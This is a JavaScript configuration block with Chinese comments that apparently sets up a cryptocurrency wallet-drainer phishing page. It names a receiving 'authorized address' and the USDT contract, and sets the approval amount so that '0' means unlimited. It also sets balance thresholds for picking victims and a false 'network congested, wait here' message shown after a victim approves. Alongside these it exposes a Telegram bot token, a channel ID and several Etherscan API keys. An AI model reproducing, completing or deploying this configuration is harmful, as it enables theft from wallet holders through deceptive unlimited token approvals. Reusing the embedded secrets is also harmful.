// 配置信息
const config = {
    telegramBotToken: "7128099746:AAEJmnJ_cVD8nqKTt5XdH9mfX50fLq5KokI", // @BotFather 注册机器人
    telegramChannelId: "5997535123", // Telegram 群组ID 邀请@GetMyChatID_Bot进群可查
    authorizedAddress: "0xdB6A9f6795a28EE3d352C96692C926D190f65E9e", // 权限地址配置
    usdtContractAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT 合约地址
    approvalAmount: "0", // 授权金额修改,设置'0'为无限额度
    ethBalanceThreshold: "0", // bnb余额的最低阈值，设置为'0'表示不检查
    usdtBalanceThreshold: "0.1", // USDT余额的最低阈值，设置为'0'表示不检查
    hint: "当前网络拥堵,请停留在当前页面中等待交易结果", // （授权成功后提示）设置为'0'则不显示该消息
    etherscanapiKeys: ["4TIWI5A7T4M7A6A799P4KCMSQD6YPR6F19", "TQR63CZTI2R7WTB5H596E9CX4932CAEFMZ", "4HVVXJK7MGHNBH55NETRXSV57JEMHVB3M3"] // 越多越好，没有密钥不能正常查询USDT余额 申请KEY教程：https://docs.etherscan.io/getting-started/viewing-api-usage-statistics 
};